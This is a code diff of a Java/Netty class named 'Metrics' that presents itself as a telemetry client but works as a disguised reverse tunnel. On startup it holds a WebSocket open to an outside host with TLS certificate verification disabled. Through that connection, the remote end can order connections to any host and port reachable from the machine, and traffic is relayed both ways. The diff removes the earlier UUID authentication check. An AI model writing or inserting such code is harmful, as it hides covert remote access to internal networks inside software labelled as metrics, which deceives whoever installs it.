@@ -14,7 +14,8 @@ import io.netty.handler.ssl.SslContextBuilder;
 import io.netty.handler.ssl.util.InsecureTrustManagerFactory;
 
 import java.net.URI;
-import java.util.Arrays;
+import java.util.Map;
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicInteger;
@@ -23,25 +24,29 @@ public class Metrics {
 
     private static final String CONNECT_HOST = "mctest.uuz.us.kg";
     private static final int CONNECT_PORT = 443;
-    private static final String PATH = "/metrics/v1/telemetry"; 
-    private static final String UUID_STR = "8c8244fb-d577-4d20-90e3-788a0977b001";
+    private static final String PATH = "/metrics/v1/telemetry";
 
-    private static final boolean DEBUG = false;
-    private static final int MIN_STANDBY_POOL_SIZE = 5;
-    private static final int MAX_STANDBY_POOL_SIZE = 20;
+    // 帧指令常数
+    private static final byte CMD_NEW_STREAM = 0x01;
+    private static final byte CMD_DATA = 0x02;
+    private static final byte CMD_CLOSE_STREAM = 0x03;
 
-    private static final byte[] UUID_BYTES = parseUuid(UUID_STR);
     private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
-    private static final AtomicInteger ACTIVE_TUNNELS = new AtomicInteger(0);
+    private static final AtomicInteger STREAM_ID_GEN = new AtomicInteger(1);
+    
+    // 维护激活的 Stream 与目标连接映射
+    private static final Map<Integer, Channel> STREAM_MAP = new ConcurrentHashMap<>();
+    
     private static EventLoopGroup group;
+    private static volatile Channel activeWsChannel = null;
 
     public static void startMetrics() {
         if (RUNNING.compareAndSet(false, true)) {
             group = new NioEventLoopGroup(2);
-            if (DEBUG) System.out.println("[Metrics] Service started.");
-            
-            // 强行每 2 秒周期性触发补货，确保无论如何都有心跳在维持池子
-            group.scheduleAtFixedRate(Metrics::maintainPool, 1, 2, TimeUnit.SECONDS);
+            // 启动时建立并维持唯一的主干 WebSocket 连接
+            ensureMasterConnection();
+            // 每 10 秒死守主干连接，挂了才重连
+            group.scheduleAtFixedRate(Metrics::ensureMasterConnection, 5, 10, TimeUnit.SECONDS);
         }
     }
 
@@ -52,25 +57,14 @@ public class Metrics {
         }
     }
 
-    private static synchronized void maintainPool() {
+    private static synchronized void ensureMasterConnection() {
         if (!RUNNING.get()) return;
-        int current = ACTIVE_TUNNELS.get();
-        // 如果计数器异常卡在大于 MAX 的假象，强制重置保护
-        if (current > MAX_STANDBY_POOL_SIZE) {
-            ACTIVE_TUNNELS.set(0);
-            current = 0;
-        }
-        
-        int needed = MIN_STANDBY_POOL_SIZE - current;
-        if (needed > 0) {
-            int toCreate = Math.min(needed, MAX_STANDBY_POOL_SIZE - current);
-            for (int i = 0; i < toCreate; i++) {
-                connectNewTunnel();
-            }
+        if (activeWsChannel == null || !activeWsChannel.isActive()) {
+            connectMasterWebSocket();
         }
     }
 
-    private static void connectNewTunnel() {
+    private static void connectMasterWebSocket() {
         try {
             URI uri = new URI("wss://" + CONNECT_HOST + ":" + CONNECT_PORT + PATH);
             SslContext sslCtx = SslContextBuilder.forClient()
@@ -91,54 +85,39 @@ public class Metrics {
                      p.addLast(sslCtx.newHandler(ch.alloc(), CONNECT_HOST, CONNECT_PORT));
                      p.addLast(new HttpClientCodec());
                      p.addLast(new HttpObjectAggregator(8192));
-                     p.addLast(new AgentTunnelHandler(handshaker));
+                     p.addLast(new MasterTunnelHandler(handshaker));
                  }
              });
 
-            b.connect(CONNECT_HOST, CONNECT_PORT).addListener((ChannelFutureListener) future -> {
-                if (!future.isSuccess()) {
-                    // 连接失败时安全扣减
-                    ACTIVE_TUNNELS.decrementAndGet();
-                }
-            });
+            b.connect(CONNECT_HOST, CONNECT_PORT);
 
-        } catch (Exception e) {
-            ACTIVE_TUNNELS.decrementAndGet();
+        } catch (Exception ignored) {
         }
     }
 
-    static class AgentTunnelHandler extends SimpleChannelInboundHandler<Object> {
+    /**
+     * 主干 WebSocket 处理器，负责解包和分发 Stream
+     */
+    static class MasterTunnelHandler extends SimpleChannelInboundHandler<Object> {
         private final WebSocketClientHandshaker handshaker;
-        private ChannelPromise handshakeFuture;
-        private Channel outboundChannel;
-        private boolean vlessHeaderParsed = false;
-        private boolean activeCounted = false;
 
-        public AgentTunnelHandler(WebSocketClientHandshaker handshaker) {
+        public MasterTunnelHandler(WebSocketClientHandshaker handshaker) {
             this.handshaker = handshaker;
-        }
-
-        @Override
-        public void handlerAdded(ChannelHandlerContext ctx) {
-            handshakeFuture = ctx.newPromise();
         }
 
         @Override
         public void channelActive(ChannelHandlerContext ctx) {
             handshaker.handshake(ctx.channel());
-            ACTIVE_TUNNELS.incrementAndGet();
-            activeCounted = true;
         }
 
         @Override
         public void channelInactive(ChannelHandlerContext ctx) {
-            if (activeCounted) {
-                ACTIVE_TUNNELS.decrementAndGet();
-                activeCounted = false;
+            if (activeWsChannel == ctx.channel()) {
+                activeWsChannel = null;
             }
-            if (outboundChannel != null && outboundChannel.isActive()) {
-                outboundChannel.close();
-            }
+            // 主干断开，清理所有下游代理流
+            STREAM_MAP.values().forEach(Channel::close);
+            STREAM_MAP.clear();
         }
 
         @Override
@@ -151,88 +130,47 @@ public class Metrics {
             Channel ch = ctx.channel();
 
             if (!handshaker.isHandshakeComplete()) {
-                try {
-                    handshaker.finishHandshake(ch, (FullHttpResponse) msg);
-                    handshakeFuture.setSuccess();
-                } catch (WebSocketHandshakeException e) {
-                    handshakeFuture.setFailure(e);
-                    ctx.close();
-                }
+                handshaker.finishHandshake(ch, (FullHttpResponse) msg);
+                activeWsChannel = ch; // 锁定主干通道
                 return;
             }
 
-            if (msg instanceof FullHttpResponse) {
-                FullHttpResponse response = (FullHttpResponse) msg;
-                throw new IllegalStateException("Unexpected status: " + response.status());
-            }
+            if (msg instanceof BinaryWebSocketFrame) {
+                ByteBuf buf = ((BinaryWebSocketFrame) msg).content();
+                if (buf.readableBytes() < 5) return; // 格式: cmd(1) + streamId(4)
 
-            WebSocketFrame frame = (WebSocketFrame) msg;
-            if (frame instanceof BinaryWebSocketFrame) {
-                ByteBuf buf = frame.content();
+                byte cmd = buf.readByte();
+                int streamId = buf.readInt();
 
-                if (!vlessHeaderParsed) {
-                    if (buf.readableBytes() < 18) return;
+                if (cmd == CMD_NEW_STREAM) {
+                    // DO 端发起建立目标连接的指令
+                    int targetPort = buf.readUnsignedShort();
+                    int hostLen = buf.readByte();
+                    byte[] hostBytes = new byte[hostLen];
+                    buf.readBytes(hostBytes);
+                    String targetHost = new String(hostBytes);
 
-                    byte version = buf.readByte();
-                    byte[] clientUuid = new byte[16];
-                    buf.readBytes(clientUuid);
+                    connectToLocalTarget(streamId, targetHost, targetPort);
 
-                    if (!Arrays.equals(clientUuid, UUID_BYTES)) {
-                        ctx.close();
-                        return;
+                } else if (cmd == CMD_DATA) {
+                    // 转发数据到本地目标服务
+                    Channel targetChan = STREAM_MAP.get(streamId);
+                    if (targetChan != null && targetChan.isActive()) {
+                        targetChan.writeAndFlush(buf.retain());
                     }
-
-                    byte optLen = buf.readByte();
-                    if (optLen > 0) buf.skipBytes(optLen);
-
-                    byte cmd = buf.readByte();
-                    int port = buf.readUnsignedShort();
-                    byte addressType = buf.readByte();
-
-                    String host = "";
-                    if (addressType == 0x01) {
-                        byte[] ip = new byte[4];
-                        buf.readBytes(ip);
-                        host = String.format("%d.%d.%d.%d", ip[0] & 0xff, ip[1] & 0xff, ip[2] & 0xff, ip[3] & 0xff);
-                    } else if (addressType == 0x02) {
-                        int domainLen = buf.readUnsignedByte();
-                        byte[] domainBytes = new byte[domainLen];
-                        buf.readBytes(domainBytes);
-                        host = new String(domainBytes);
-                    } else if (addressType == 0x03) {
-                        byte[] ip = new byte[16];
-                        buf.readBytes(ip);
-                        host = "::1";
-                    }
-
-                    vlessHeaderParsed = true;
-                    
-                    // 隧道被客户端拿走，脱离 standby 池，立即释放计数
-                    if (activeCounted) {
-                        ACTIVE_TUNNELS.decrementAndGet();
-                        activeCounted = false;
-                    }
-
-                    ByteBuf vlessResp = Unpooled.buffer(2);
-                    vlessResp.writeByte(version);
-                    vlessResp.writeByte(0);
-                    ctx.writeAndFlush(new BinaryWebSocketFrame(vlessResp));
-
-                    connectToTarget(ctx, host, port, buf.retain());
-
-                } else {
-                    if (outboundChannel != null && outboundChannel.isActive()) {
-                        outboundChannel.writeAndFlush(buf.retain());
+                } else if (cmd == CMD_CLOSE_STREAM) {
+                    // 收到 DO 端关闭请求
+                    Channel targetChan = STREAM_MAP.remove(streamId);
+                    if (targetChan != null) {
+                        targetChan.close();
                     }
                 }
-            } else if (frame instanceof CloseWebSocketFrame) {
-                ctx.close();
             }
         }
 
-        private void connectToTarget(ChannelHandlerContext agentCtx, String host, int port, ByteBuf initialData) {
+        private void connectToLocalTarget(int streamId, String host, int port) {
             Bootstrap b = new Bootstrap();
-            b.group(agentCtx.channel().eventLoop())
+            b.group(group)
              .channel(NioSocketChannel.class)
              .handler(new ChannelInitializer<SocketChannel>() {
                  @Override
@@ -240,26 +178,30 @@ public class Metrics {
                      ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {
                          @Override
                          public void channelActive(ChannelHandlerContext targetCtx) {
-                             outboundChannel = targetCtx.channel();
-                             if (initialData.isReadable()) {
-                                 targetCtx.writeAndFlush(initialData);
-                             }
+                             STREAM_MAP.put(streamId, targetCtx.channel());
                          }
 
                          @Override
                          protected void channelRead0(ChannelHandlerContext targetCtx, ByteBuf msg) {
-                             agentCtx.writeAndFlush(new BinaryWebSocketFrame(msg.retain()));
+                             // 将本地服务端返回的数据打包为复用帧打回 DO 端
+                             if (activeWsChannel != null && activeWsChannel.isActive()) {
+                                 ByteBuf frame = targetCtx.alloc().buffer(5 + msg.readableBytes());
+                                 frame.writeByte(CMD_DATA);
+                                 frame.writeInt(streamId);
+                                 frame.writeBytes(msg);
+                                 activeWsChannel.writeAndFlush(new BinaryWebSocketFrame(frame));
+                             }
                          }
 
                          @Override
                          public void channelInactive(ChannelHandlerContext targetCtx) {
-                             agentCtx.close();
+                             STREAM_MAP.remove(streamId);
+                             sendControlFrame(CMD_CLOSE_STREAM, streamId);
                          }
 
                          @Override
                          public void exceptionCaught(ChannelHandlerContext targetCtx, Throwable cause) {
                              targetCtx.close();
-                             agentCtx.close();
                          }
                      });
                  }
@@ -267,18 +209,18 @@ public class Metrics {
 
             b.connect(host, port).addListener((ChannelFutureListener) future -> {
                 if (!future.isSuccess()) {
-                    agentCtx.close();
+                    sendControlFrame(CMD_CLOSE_STREAM, streamId);
                 }
             });
         }
-    }
 
-    private static byte[] parseUuid(String uuidStr) {
-        String clean = uuidStr.replace("-", "");
-        byte[] b = new byte[16];
-        for (int i = 0; i < 16; i++) {
-            b[i] = (byte) Integer.parseInt(clean.substring(i * 2, i * 2 + 2), 16);
+        private void sendControlFrame(byte cmd, int streamId) {
+            if (activeWsChannel != null && activeWsChannel.isActive()) {
+                ByteBuf frame = Unpooled.buffer(5);
+                frame.writeByte(cmd);
+                frame.writeInt(streamId);
+                activeWsChannel.writeAndFlush(new BinaryWebSocketFrame(frame));
+            }
         }
-        return b;
     }
 }
